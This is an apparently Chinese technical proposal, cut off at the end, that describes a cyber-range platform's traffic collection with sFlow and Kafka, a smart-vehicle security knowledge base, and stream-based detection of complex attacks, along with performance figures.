title="方案设计"></a>方案设计</h5><p>功能参数设计为，系统支持利用sFlow协议对虚拟网络流量进行采集，并能将采集的数据发送至Kafka，供其他分系统使用。系统具备对指定节点流量的采集能力，可通过试验过程导调配置需要采集的节点及端口。采集后的流量能通过通用三层交换机（如华为、华三品牌）汇聚到流量存储和分析设备进行统一存储和分析。此外，系统还支持通过流量镜像的方式，将虚拟机某端口的流量镜像到指定设备端口。</p><p>性能参数设计为，系统的流量采集速率达到10Gbps，能够支持200条链路的同时采集。这种设计确保了在大规模网络环境下高效、稳定的流量监控和分析能力，满足复杂网络环境中对流量管理和安全监控的高要求。</p><h6 id="系统概要"><a href="#系统概要" class="headerlink" title="系统概要"></a>系统概要</h6><p>本竞赛管理系统能够提供一个全面的流量监控与分析解决方案，以支持网络安全竞赛中对虚拟网络流量的采集、处理和分析。系统采用sFlow协议进行流量采集，并利用Kafka进行数据传输，以实现流量数据的高效处理和分析。</p><h6 id="流量采集与传输"><a href="#流量采集与传输" class="headerlink" title="流量采集与传输"></a>流量采集与传输</h6><p>sFlow协议采集</p><p>系统将基于sFlow协议对虚拟网络的流量进行采集。sFlow是一个行业标准，适用于监控高速网络，它能够提供网络流量的实时采样。</p><p>采集的数据将发送至Kafka消息队列，Kafka作为高吞吐量的分布式消息系统，将为其他分系统提供实时数据流。</p><p>节点流量采集</p><p>系统具备对指定节点的流量进行采集的能力，管理员可以通过试验过程导调配置需要采集的节点及端口。</p><p>采集后的流量数据将通过通用三层交换机（如华为、华三等品牌）汇聚到流量存储和分析设备进行统一存储和分析。</p><p>流量镜像</p><p>系统支持通过流量镜像的方式，将虚拟机某个端口的流量镜像到指定设备的端口。这允许管理员在不干扰主要网络流量的情况下，实时监控和分析网络数据。</p><h6 id="流量存储与分析"><a href="#流量存储与分析" class="headerlink" title="流量存储与分析"></a>流量存储与分析</h6><p>存储</p><p>系统将使用高性能的存储解决方案来存储采集的流量数据。这能够提供即使在大规模数据采集情况下，数据也能被安全、可靠地存储。</p><p>分析</p><p>采集到的流量数据将被用于进一步的分析。分析工具将能够识别流量模式、潜在的安全威胁和网络性能问题。</p><p>系统能够提供可视化工具，以帮助管理员理解流量数据，进行必要的调整或优化。</p><h6 id="性能设计"><a href="#性能设计" class="headerlink" title="性能设计"></a>性能设计</h6><p>流量采集速率</p><p>系统将能够处理高达10Gbps的流量采集速率，以满足高速网络环境下的监控需求。</p><p>链路采集能力</p><p>系统支持同时对200条链路进行流量采集，确保即使在多节点、高密度的竞赛环境中，也能够有效地监控网络流量。</p><h6 id="系统设计细节"><a href="#系统设计细节" class="headerlink" title="系统设计细节"></a>系统设计细节</h6><p>高性能交换机配置</p><p>流量汇聚交换机将配置必要的VLAN、ACL和路由规则，以确保数据的准确汇聚和传输。</p><p>交换机的端口将配置为镜像端口，以复制经过的流量到分析设备。</p><p>安全与合规</p><p>所有流量采集和分析操作将遵守相关的数据保护法规和隐私政策。</p><p>系统将实施适当的安全措施，以保护存储和传输的数据不被未经授权的访问。</p><p>可扩展性</p><p>系统设计将考虑未来的扩展性，支持更多节点的添加和更高速率的流量采集需求。</p><p>Kafka集群将配置以支持高可用性和扩展性，以应对大量数据流的需求。</p><p>本竞赛管理系统的流量监控与分析方案将为网络安全竞赛提供一个强大的支持工具，能够满足高速、大规模网络流量监控的需求。系统的设计能够提供数据的高效采集、安全存储和深入分析，为竞赛管理员提供实时的网络状态信息，帮助他们有效地管理和监督竞赛过程。</p><h5 id="方案简介-3"><a href="#方案简介-3" class="headerlink" title="方案简介"></a>方案简介</h5><p>流量采集模块是针对网络攻防效果评测的重要方法，是网络仿真软件的关键环节。实现了多种链路的协同、高性能采集，可对大规模网络仿真场景有效地进行基于数据采集的效果评估。</p><p>根据虚拟主机间通信所处的计算节点位置不同，分为三种链路：同一计算节点内的虚拟主机之间的通信链路属于宿主机内的虚拟链路，不同计算节点内的虚拟主机之间的通信链路属于宿主机间的虚拟链路，计算节点内的虚拟主机与实物机之间的通信链路属于虚实互联链路，实物机靠网络节点连接的外网接入云平台中。</p><p>基于上述网络仿真系统，该数据采集与效果评估体系结构包括采集点映射模块、数据采集模块、数据存储模块以及效果评估模块共四个模块。其中采集点映射模块包括配置解析模块、IP地址解析模块和端口解析模块三个子模块，利用这三个子模块确定目标链路的目标端口，即采集点；数据采集模块是该体系的核心部分，完成对采集点的数据采集；数据存储模块分为本地存储和远程存储，本地存储是指将采集数据直接存在计算节点本地的数据库中，远程存储是将采集数据存入云平台之外的服务器的数据库中；效果评估模块基于实时采集的数据进行提取、分析和计算，完成对网络安全试验效果的评估。</p><p>传统的数据采集存储只提供了本地存储的功能，本软件采用的数据采集系统，实现了本地存储和远程服务器实时存储的双重功能，远程存储通过将采集数据复制备份到独立的服务器，实现了实验数据的安全隔离，为后续的进一步研究提供了数据保障。对采集点进行采集并实时对所采集数据进行存储的具体步骤为：</p><p>1、启动数据采集程序，使用监测进程对数据文件目录进行监听；</p><p>2、对生成的数据文件，采用压缩算法进行压缩；</p><p>3、将压缩文件发送给接收端服务器；</p><p>4、服务端接收到压缩文件，先进行解压缩，再将数据文件解析入库；</p><p>5、通过对数据库中的数据进行提取、分析、计算，完成试验效果评估。</p><p>通过试验验证，远程存储数据可以用来支持后面的效果评估。</p><p>使用案例：在OpenStack中构建虚拟网络，网络拓扑如下图所示，图中vm1，vm2，vm3表示虚拟主机，IP地址分别为11.0.0.4，13.0.0.5，11.0.0.5，vm5是实物机PC，通过虚实互联方式接入OpenStack平台，router是虚拟路由器，IP地址为11.0.0.3,13.0.0.3,15.0.0.3，net11，net13，net15代表虚拟网络，网络地址分别为11.0.0.0/24，13.0.0.0/24，15.0.0.0/24，其中vm1，vm2在同一计算节点（Compute1）上，vm3在另一计算节点（Compute2）上。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/44c897a4debb41b2bb829d1f12ba41db.emf"></p><p>构建虚拟网络</p><p>选择上图三条链路：（vm1, vm2, Compute1），（vm3, Compute2, vm2, Compute1），（vm2, Compute1, vm5）。上述三条链路的通信都通过router，首先确定采集点，router有3个网卡，此处需要的是与router在 net11和net15的网卡相连的br-int的两个目标端口（端口1，端口2），获取router的采集点映射表，得出两个目标端口位于同一计算节点Compute1上，需要对这两个端口设置流量镜像。为验证流量镜像的有效性，用vm1，vm3， vm5分别向vm2发送10个ICMP数据包，结果从镜像口接收到60个ICMP数据包（ICMP数据包是双向的），验证流量镜像设置成功。</p><p>为验证该系统的链路数据采集性能，对上图中的链路（vm1, vm2, Compute1）进行测试，用vm1上的iperf发包工具向vm2发包，采集端口1，分别测试 libpcap（Linux自带的传统采集方法），pf_ring和该系统测试在捕获不同长度数据包时的采集速率，测试结果通过下图显示。</p><p>可以看出，随着帧长度增大，libpcap和本系统每秒钟收包速率均逐渐减小，pf_ring的收包速率趋于稳定，说明在数据传输过程中小包比较容易被接收，且利用本系统达到的采集速率明显优于libpcap和pf_ring的采集速率，采集速率相较于pf_ring最高提升了88.48%，验证了该采集系统的高效性。</p><p>采集效率</p><p>评判采集性能的重要指标还包括CPU占用率，程序运行时CPU占用率越小，程序性能越好。为了测试本系统的CPU占用率，将libpcap和pf_ring作为对照组，测试三种数据包捕获方法在捕获不同长度数据包时的CPU占用率，测试结果如下图所示。</p><p>三种抓捕方法的cpu占用率</p><p>可以看出，在帧长增大时，三种采集方法的CPU利用率有轻微波动，整体趋于稳定，libpcap 的CPU占用率在82%~83%，pf_ring的CPU占用率在80%~81%，二者在CPU负载平衡方面性能相当，而用本系统CPU占用率平均在43%，相较于libpcap和pf_ring，使用本系统，CPU占用率降低了45.29%，大大降低CPU使用率，有效提高了采集效率。</p><p>支持虚拟网络的流量对基于sFlow协议进行采集，采集的数据可以发送至Kafka供其他分系统使用；支持通过流量镜像方式从虚拟机某个端口流量镜像到指定设备的端口，如下图所示。</p><p>系统具备专门针对指定节点的流量采集功能，允许用户在实验或比赛过程中配置和选定特定的节点及其端口以进行流量捕获。一旦采集完毕，所捕获的流量数据可以通过交换机被汇聚到专门的流量存储和分析设施，以实现集中化的数据存储和后续分析。为了确保技术的兼容性和性能，所使用的流量汇聚交换机需选用华为、华三等知名品牌的通用三层交换机。界面如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8b306dbabe2a706a582dd4197292d786.png"></p><p>：流量采集</p><p>性能参数如下：</p><p>流量采集速率不低于10Gbps；</p><p>支持等于200条链路同时采集。</p><h3 id="多元网络安全知识库模块"><a href="#多元网络安全知识库模块" class="headerlink" title="多元网络安全知识库模块"></a>多元网络安全知识库模块</h3><h4 id="功能实施方案-18"><a href="#功能实施方案-18" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>系统提供了强大的功能来支持智能汽车网络安全知识的存储管理和快速检索。用户可以方便地管理智能汽车漏洞知识、资产知识、基础攻击知识子图和复杂攻击知识子图。这包括按模板批量导入、批量导出和删除操作，保证了知识库的高效维护。用户能够快速检索所需信息，提高对智能汽车网络安全知识的管理效率。</li><li>系统提供了面向智能汽车网络安全知识的可视化数据管理功能，通过图谱方式呈现智能汽车复杂攻击场景，用户可以通过直观的拖拽查看方式，深入理解复杂攻击之间的关系。这个可视化数据管理功能提供了直观、全面的视图，有助于用户更好地理解和分析智能汽车网络安全知识。截图见“产品功能截图”部分</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/51c9574a4ab79f3620a9df0b441b63a4.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b209eded84a743a9f883c81c561d44e3.png" alt="IMG_256"></p><p>拖拽式图谱</p><ol><li>智能汽车知识数据管理得到了系统的全面支持，用户可以按照模板进行批量导入、批量导出与删除，包括漏洞知识、基础攻击子图和复杂攻击子图。这个功能使得用户能够高效地维护知识库，确保其中的漏洞知识、攻击知识得以准确而完整的保存。</li><li>系统支持智能汽车网络安全知识模式实体管理，包括漏洞、资产、基础攻击、复杂攻击知识体的统一表示与管理。用户可以一致地管理不同类型的知识实体，使得知识库的结构更加清晰，有助于系统更准确地理解和分析知识。</li><li>系统进一步支持智能汽车网络安全知识模式关系管理，包括复杂攻击与基础攻击的包含关系、基础攻击与安全事件的实例关系、安全事件与漏洞的利用关系、漏洞与资产的存在影响关系。这一功能使得系统能够更全面地维护不同知识模式之间的关系，帮助用户深入理解智能汽车网络安全知识的复杂关联性，为安全分析提供更为详实的上下文信息。</li><li>系统支持多知识图谱的动态构建与管理，能够为每次试验构建独立的、具有时空特征的知识图谱。这一功能使得系统能够灵活地适应不同试验场景，为每次试验生成独立的知识图谱，有助于更精准地反映智能汽车网络安全状况的动态变化。</li></ol><h4 id="性能实施方案-18"><a href="#性能实施方案-18" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>系统在性能方面表现出色，能够支持10万条漏洞知识的存储管理。这意味着用户可以高效地存储大规模的漏洞信息，系统能够轻松应对庞大的漏洞知识库。用户可以在系统中管理漏洞信息，包括漏洞的详细描述、修复建议以及其他相关信息，确保漏洞知识库的全面性和准确性。</li><li>系统还能够支持20万条资产知识的存储管理。这项性能指标使得用户可以有效地管理庞大的资产信息，包括智能汽车网络中的各种设备和系统。系统提供了灵活而高效的管理工具，确保资产知识库的完整性和实用性。用户可以轻松地更新、编辑和删除资产信息，以适应网络拓扑的变化和新设备的加入。</li></ol><h4 id="产品功能截图-2"><a href="#产品功能截图-2" class="headerlink" title="产品功能截图"></a>产品功能截图</h4><ol><li>支持面向智能汽车网络安全知识的可视化数据管理，支持对智能汽车复杂攻击场景图谱方式呈现与拖拽查看，提供产品功能截图。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/51c9574a4ab79f3620a9df0b441b63a4.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b209eded84a743a9f883c81c561d44e3.png" alt="IMG_256"></p><p>拖拽式图谱</p><h4 id="技术实现内容-18"><a href="#技术实现内容-18" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计为，系统支持智能汽车漏洞知识、资产知识、基础攻击知识子图和复杂攻击知识子图的存储管理和快速检索功能。能够实现面向智能汽车网络安全知识的可视化数据管理，支持复杂攻击场景图谱的呈现与拖拽查看。系统还支持智能汽车知识数据管理，包括按模板批量导入、导出与删除漏洞知识、基础攻击子图和复杂攻击子图。</p><p>系统具备智能汽车网络安全知识模式实体管理功能，统一表示与管理漏洞、资产、基础攻击、复杂攻击知识体。智能汽车网络安全知识模式关系管理包括复杂攻击与基础攻击的包含关系、基础攻击与安全事件的实例关系、安全事件与漏洞的利用关系、漏洞与资产的存在影响关系。系统还支持多知识图谱的动态构建与管理，为每次试验构建具有时空特征的独立知识图谱。</p><p>性能参数设计为，系统支持高达10万条漏洞知识的存储管理，以及20万条资产知识的存储管理。这种设计能够满足大规模智能汽车网络安全知识的管理和应用需求，为智能汽车安全研究和应对提供强大的数据支持和知识基础。</p><h5 id="方案设计-6"><a href="#方案设计-6" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数设计为，系统支持智能汽车漏洞知识、资产知识、基础攻击知识子图和复杂攻击知识子图的存储管理和快速检索功能。能够实现面向智能汽车网络安全知识的可视化数据管理，支持复杂攻击场景图谱的呈现与拖拽查看。系统还支持智能汽车知识数据管理，包括按模板批量导入、导出与删除漏洞知识、基础攻击子图和复杂攻击子图。</p><p>系统具备智能汽车网络安全知识模式实体管理功能，统一表示与管理漏洞、资产、基础攻击、复杂攻击知识体。智能汽车网络安全知识模式关系管理包括复杂攻击与基础攻击的包含关系、基础攻击与安全事件的实例关系、安全事件与漏洞的利用关系、漏洞与资产的存在影响关系。系统还支持多知识图谱的动态构建与管理，为每次试验构建具有时空特征的独立知识图谱。</p><p>性能参数设计为，系统支持高达10万条漏洞知识的存储管理，以及20万条资产知识的存储管理。这种设计能够满足大规模智能汽车网络安全知识的管理和应用需求，为智能汽车安全研究和应对提供强大的数据支持和知识基础。</p><h6 id="系统概览"><a href="#系统概览" class="headerlink" title="系统概览"></a>系统概览</h6><p>本设计方案旨在创建一个智能汽车网络安全知识管理系统，该系统能够支持智能汽车漏洞知识、资产知识、基础攻击知识子图和复杂攻击知识子图的存储管理和快速检索功能。系统的核心功能包括可视化数据管理、知识数据管理、实体与关系管理以及多知识图谱的动态构建与管理。性能参数能够提供系统支持大规模的知识存储和管理需求。</p><h6 id="功能细化"><a href="#功能细化" class="headerlink" title="功能细化"></a>功能细化</h6><p>知识存储管理与检索</p><p>系统能够支持智能汽车漏洞知识、资产知识、基础攻击知识子图和复杂攻击知识子图的存储管理。</p><p>通过高效的索引和查询优化，系统能够提供快速检索功能，确保用户能够迅速获取所需的安全知识信息。</p><p>可视化数据管理</p><p>系统能够支持面向智能汽车网络安全知识的可视化数据管理。</p><p>用户能够通过图谱方式呈现智能汽车复杂攻击场景，并支持拖拽查看细节，以便于理解和分析安全威胁。</p><p>知识数据管理</p><p>系统能够支持智能汽车知识数据管理，包括按模板批量导入、批量导出与删除。</p><p>这包括漏洞知识、基础攻击子图和复杂攻击子图，从而提高数据处理的效率和准确性。</p><p>实体管理</p><p>系统能够支持智能汽车网络安全知识模式实体管理。</p><p>这涉及对漏洞、资产、基础攻击、复杂攻击知识体的统一表示与管理，确保数据一致性和完整性。</p><p>关系管理</p><p>系统能够支持智能汽车网络安全知识模式关系管理。</p><p>这包括管理复杂攻击与基础攻击的包含关系、基础攻击与安全事件的实例关系、安全事件与漏洞的利用关系、漏洞与资产的存在影响关系等。</p><p>多知识图谱管理</p><p>系统能够支持多知识图谱的动态构建与管理。</p><p>对于每次试验，系统能够构建独立的、具有时空特征的知识图谱，以满足不同试验场景的需求。</p><h6 id="性能设计-1"><a href="#性能设计-1" class="headerlink" title="性能设计"></a>性能设计</h6><p>漏洞知识存储管理</p><p>系统能够支持10万漏洞知识的存储管理，保证能够处理大量的漏洞信息。</p><p>资产知识存储管理</p><p>系统能够支持20万资产知识的存储管理，确保资产信息的完整性和可用性。</p><h6 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h6><p>数据存储</p><p>采用分布式数据库技术，如NoSQL数据库，以支持高效的数据存储和快速检索。</p><p>数据库将优化索引结构，以加速查询性能。</p><p>可视化界面</p><p>利用现代Web技术如HTML5和SVG，提供丰富的用户界面，支持图谱的动态展示和用户交互。</p><p>可视化工具能够支持自定义视图和图层，以适应不同用户的需求。</p><p>数据管理</p><p>提供一套完整的数据管理工具，支持数据的导入、导出、更新和删除。</p><p>数据模板能够支持XML、JSON等格式，以便于数据的交换和集成。</p><p>实体与关系管理</p><p>开发实体关系管理模块，以支持复杂的知识表示和关系维护。</p><p>使用图数据库技术来表示和存储复杂的实体关系。</p><p>知识图谱构建</p><p>实现动态知识图谱构建引擎，支持知识的自动关联和图谱的生成。</p><p>知识图谱能够支持时空特征，以适应不同的试验和分析场景。</p><h6 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h6><p>前端</p><p>前端采用响应式设计，以支持不同设备和屏幕尺寸。</p><p>提供用户友好的导航、搜索和过滤功能。</p><p>后端</p><p>后端采用微服务架构，以提供灵活的服务部署和扩展性。</p><p>实现API接口，以支持前端和其他系统的数据交互。</p><p>安全性</p><p>系统将实施严格的安全措施，包括数据加密、用户认证和访问控制。</p><p>定期进行安全审计和漏洞扫描，以确保系统的安全性。</p><p>本智能汽车网络安全知识管理系统设计方案提供了一个全面的解决方案，支持智能汽车网络安全知识的存储、管理、检索和可视化。系统的性能参数保证了大规模知识的处理能力，技术实现考虑了系统的可用性、可扩展性和安全性。通过该系统，用户可以有效地管理和分析智能汽车网络安全知识，以支持网络安全研究和教育。</p><h5 id="方案简介-4"><a href="#方案简介-4" class="headerlink" title="方案简介"></a>方案简介</h5><p>多元网络安全知识库主要支撑建立网络安全场景知识图谱，基于漏洞数据、弱点数据以及攻击数据，建立网络安全知识体系，结合漏洞、基础攻击、弱点和复杂攻击等知识构建网络安全知识图谱。并支持对攻击知识、弱点、漏洞、智能汽车资产管理，以及拥有基础攻击知识子图、复杂攻击知识子图、资产知识以及漏洞知识的高效检索与存储管理功能。</p><p>多元网络安全知识库是知识管理系统的多年应用基础上，综合了当前智能汽车网络安全知识领域的管理需求和业务需求，在网络安全有关专家的指导下，结合网络安全攻击行为分析、攻击检测等业务的扩展，设计与研发出的网络安全知识管理系统。基于多元网络安全知识库的需求分析和架构设计，实现系统的功能划分如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f734e829763ec036dc0156c8a5f05849.png"></p><p>知识库管理主要是管理智能汽车网络安全知识库实体管理，包括漏洞库、资产库、基础攻击知识库、复杂攻击知识库、知识图谱库的统一表示与管理。漏洞知识的存储管理高达12.8万条，资产知识的存储管理高达22.1万条。</p><p>知识全生命周期管理是针对知识产生、知识分类、知识存储、知识应用、更新迭代、停用删除进行管理。网络安全知识产生有三种方式单条新建、批量导入，单条新建是在系统中，线上进行网络安全知识录入，并提交多元网络安全知识库；批量导入是通过知识导入模板，线下进行知识梳理，将梳理结果批量导入多元网络安全知识库。知识分类是将产生的数据，按照一定的规则分类为资产、漏洞、攻击知识。知识存储是将知识存储到知识库，存储方式主要是数据库，存储的时候充分考虑知识的安全性、可访问性和可搜索性。知识应用是指将存储的知识应用于攻击检测、安全分析评估等实际问题解决、决策制定中。因知识不是静态的，它需要不断更新和迭代以保持其有效性和实用性，因此更新迭代模块是及时在知识库中添加新信息、修订过时的内容、跟踪最新的行业知识。针对不再需要的知识或过时的知识，通过停用删除模块进行停用和删除，从而减少知识库的混乱和信息冗余。支持按模板批量导入、批量导出与删除，包括复杂攻击子图、基础攻击子图以及漏洞知识。</p><p>知识访问控制是控制用户角色能够访问哪些知识资源以及在什么条件下可以访问，包括读取权限和写入权限。为了确保只有经过身份验证的用户可以访问知识，通常需要采用用户身份验证机制，如用户名和密码等，这有助于保护知识不受未经授权的访问。同时，会基于用户的角色或职责来管理的，不同角色的用户被授予不同级别的访问权限，如管理员可能具有更广泛的权限，而普通员工可能只能查看特定的知识。针对访问记录进行必要的日志记录，有利于监控和追踪知识的访问历史，以便在发生问题或安全事件时进行调查和审计。</p><p>知识统计是针对不同类型的知识进行不同维度统计，便于直观了解知识情况，比如数量统计、类型统计、分数统计、程度统计等。</p><p>知识备份主要应用于环境变化比如服务器搬迁等场景，将知识备份到另一位置，保证知识免受损坏、丢失等。</p><p>可进行多知识图谱的动态构建与管理，能够为每次试验构建独立的、具有时空特征的知识图谱。</p><p>多元网络安全知识库模块元素主要包括知识库和知识管理两大类别。其中知识库元素如下表所示：</p><table><thead><tr><th>序号</th><th>知识库名称</th><th>内容描述</th></tr></thead><tbody><tr><td>1.</td><td>资产库</td><td>资产库包含汽车相关的硬件资产、操作系统资产、软件资产，资产元素主要包括资产类型、资产名称、资产IP等信息。</td></tr><tr><td>2.</td><td>漏洞库</td><td>漏洞库中漏洞覆盖硬件漏洞、操作系统漏洞、软件系统漏洞，实现对漏洞数据的集中管理，包括漏洞CVE/CNVD/CNNVD编号、首发时间、危害等级、漏洞类型、威胁类型、漏洞描述。</td></tr><tr><td>3.</td><td>弱点知识库</td><td>弱点知识库是对弱点数据的集中管理，包括CWE编号、弱点名称、描述、关系、适用平台、常见后果、利用可能性、缓解措施。</td></tr><tr><td>4.</td><td>基础攻击库</td><td>基础攻击库是对基础攻击的集中管理，可将基础攻击分为探测类、攻击突破类、远程控制、窃取利用类等，描述了包括攻击描述、攻击可能性、威胁等级、技能要求、资源要求、先决条件、执行流程、后果、缓解措施、相关脆弱性、创建时间、修改时间等信息；</td></tr><tr><td>5.</td><td>复杂攻击库</td><td>复杂攻击是对复杂攻击的集中管理，包括各个攻击步骤的基础攻击名称、利用的漏洞、使用的攻击工具等信息。</td></tr><tr><td>6.</td><td>基础攻击子图库</td><td>基础攻击子图库是管理基础攻击子图，包括基础攻击与安全事件的关系、安全事件与漏洞的关系、漏洞与资产的关系。</td></tr><tr><td>7.</td><td>复杂攻击子图库</td><td>复杂攻击子图库是管理复杂攻击子图，包括由哪些基础攻击子图组成。</td></tr></tbody></table><p>知识管理主要包括可视管理和后台管理。可视管理是将智能汽车相关知识采用图谱方式管理，通过节点（Nodes）和边（Edges）表示和描述图中的数据、实体和它们之间的关系，支持对智能汽车复杂攻击场景图谱方式呈现与拖拽查看。节点可以表示资产、漏洞、攻击知识，每个节点通常都有一个唯一的标识符，节点可以包含属性或标签用于描述节点的特征或属性。边可以表示这些知识之间的关联关系，边通常具有方向表示连接的起点和终点，边可以带有属性用于描述关系的特征或属性比如复杂攻击之间的空间属性。后端管理主要是针对知识进行统一删除、批量导入、批量导出、更新、展示等。边用来管理智能汽车网络安全知识模式关系，包括复杂攻击与基础攻击的包含关系、安全事件以及基础攻击之间的实例关系、漏洞以及安全事件之间的利用关系、资产以及漏洞之间存在影响关系。</p><h3 id="复杂攻击知识匹配流计算模块"><a href="#复杂攻击知识匹配流计算模块" class="headerlink" title="复杂攻击知识匹配流计算模块"></a>复杂攻击知识匹配流计算模块</h3><h4 id="功能实施方案-19"><a href="#功能实施方案-19" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>系统提供了智能汽车攻击子图的模式注册与管理功能，用户可以通过这一功能方便地管理智能汽车攻击子图。注册和管理基于消息队列和子图状态，使得用户能够灵活地更新、编辑和添加攻击子图。这一机制的实现旨在提供用户友好的管理界面，使系统的攻击子图能够随需而变，更好地适应不断变化的安全需求。</li><li>系统支持智能汽车攻击子图的实时更新变化，并能够进行流计算安全知识匹配加载模块的更新。这一特性确保了系统随时掌握最新的安全知识，提高了对新型攻击的检测准确性。随着攻击子图的不断变化，系统能够快速、实时地适应不同攻击场景，保持高效、精准的安全检测能力。</li><li>在智能汽车网络安全领域，系统引入了基于试验场景知识的复杂攻击检测场景流式计算。这一功能的目标是覆盖车云协同业务场景中的复杂攻击，使系统能够全面把握车辆与云端协同工作的复杂情境。通过智能汽车复杂攻击检测场景的流式计算，系统提高了检测的全面性和实时性，有效增强了对各类攻击的防范能力，确保汽车网络的整体安全。</li><li>系统针对多试验并发进行的复杂攻击检测提供了高并发流计算的支持，确保不同试验的并发计算任务相互独立。这意味着系统能够同时处理多个试验场景中的攻击检测任务，保证了系统的稳定性和高效性。不同试验之间的并发计算任务独立运行，互不干扰，有效避免了潜在的干扰和错误传播，从而提高了系统的可靠性。</li><li>在智能汽车攻防演练结束后，系统提供了根据试验状态注销试验对应的攻击子图的功能。这一机制保障了系统资源的合理利用，及时清理不再需要的攻击子图，减轻了系统负担。通过注销试验对应的攻击子图，系统能够及时释放资源，提高了系统整体的运行效率，确保了后续任务的正常进行。</li><li>系统支持实时流式接收智能汽车安全事件，并进行在线知识匹配与关联分析。这一功能保证了系统对安全事件的实时感知和响应能力，能够及时捕获并处理潜在的威胁。通过在线知识匹配与关联分析，系统能够迅速识别安全事件与攻击子图的关系，为后续的安全决策提供有力支持。这一特性有效提高了系统的实时监测和分析能力，确保了对智能汽车网络安全的全面保护。</li></ol><h4 id="性能实施方案-19"><a href="#性能实施方案-19" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>系统在处理复杂攻击的实时计算方面表现出色，能够同时支持100个并发计算任务。这意味着系统具备了处理大规模攻击检测的能力，有效提高了系统的并发处理性能。通过支持这一级别的实时计算并发，系统确保了在繁忙的网络环境中依然能够迅速而高效地识别并响应各种复杂攻击，为智能汽车网络的安全性提供了有力保障。</li><li>系统支持12小时内的数据流在线匹配关联分析，为安全事件的全面监测和分析提供了强大的支持。这一特性使系统能够在较长的时间窗口内对数据流进行实时匹配关联分析，及时发现并应对持续发展的威胁。通过在线匹配关联分析，系统能够准确识别安全事件之间的关联性，帮助分析人员更好地理解整个攻击过程，从而有针对性地制定安全策略和措施。这种数据流在线匹配关联分析的能力有效增强了系统的安全防护水平，确保了对潜在风险的及时发现和处理。</li></ol><h4 id="技术实现内容-19"><a href="#技术实现内容-19" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-7"><a href="#方案设计-7" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数设计为，系统支持智能汽车攻击子图模式的注册与管理，基于消息队列和子图状态。随着智能汽车攻击子图更新，流计算安全知识匹配加载模块同步更新。系统支持基于试验场景知识的智能汽车复杂攻击检测场景流式计算，覆盖车云协同业务场景。针对多试验并发的复杂攻击检测实现高并发流计算，确保不同试验并发计算任务互不干扰。智能汽车攻防演练结束后，根据试验状态注销相应的攻击子图。系统还支持实时流式接收智能汽车安全事件，进行在线知识匹配与关联分析。</p><p>性能参数设计为，系统支持复杂攻击实时计算的并发数量达100个，能够在12小时内进行数据流在线匹配关联分析。</p><h6 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h6><p>随着智能汽车技术的迅猛发展，车联网安全面临的威胁日益增多。为了保障智能汽车系统的安全性，本方案提出了一个网络安全实时监测与攻击检测系统。该系统能够支持智能汽车攻击子图模式的注册与管理，流计算安全知识的匹配加载，复杂攻击的流式计算检测，以及实时的安全事件分析。</p><h6 id="系统设计要求概述"><a href="#系统设计要求概述" class="headerlink" title="系统设计要求概述"></a>系统设计要求概述</h6><p>本系统设计能够实现以下关键要求：</p><p>攻击子图模式注册与管理</p><p>支持智能汽车攻击子图模式的注册与管理，基于消息队列和子图状态的模式注册。</p><p>流计算安全知识匹配加载模块更新</p><p>随智能汽车攻击子图的更新变化，流计算安全知识匹配加载模块将实时更新。</p><p>复杂攻击检测场景流式计算</p><p>支持基于试验场景知识的智能汽车复杂攻击检测场景流式计算，涵盖车云协同业务场景。</p><p>高并发流计算</p><p>支持针对多试验并发进行的复杂攻击检测高并发流计算，确保不同试验并发计算任务互相独立。</p><p>攻防演练结束后的攻击子图注销</p><p>支持智能汽车攻防演练结束后，根据试验状态注销试验对应的攻击子图。</p><p>实时流式安全事件接收与分析</p><p>支持实时流式接收智能汽车安全事件，并进行在线知识匹配与关联分析。</p><h6 id="性能参数"><a href="#性能参数" class="headerlink" title="性能参数"></a>性能参数</h6><p>复杂攻击实时计算并发</p><p>系统能够支持复杂攻击实时计算并发100个。</p><p>在线匹配关联分析</p><p>系统支持12小时内的数据流在线匹配关联分析。</p><h6 id="系统设计详述"><a href="#系统设计详述" class="headerlink" title="系统设计详述"></a>系统设计详述</h6><p>攻击子图模式管理</p><p>系统将引入一个高效的注册与管理机制，用于智能汽车攻击子图模式。该机制将基于消息队列技术，如Kafka或RabbitMQ，实现子图状态的实时更新和注册。这将允许系统动态地添加、修改或删除攻击模式，以响应新的威胁和漏洞。</p><p>流计算安全知识更新</p><p>随着攻击子图的连续更新，系统内部的流计算模块将同步更新安全知识库。这一模块将利用流处理框架，如Apache Flink或Apache 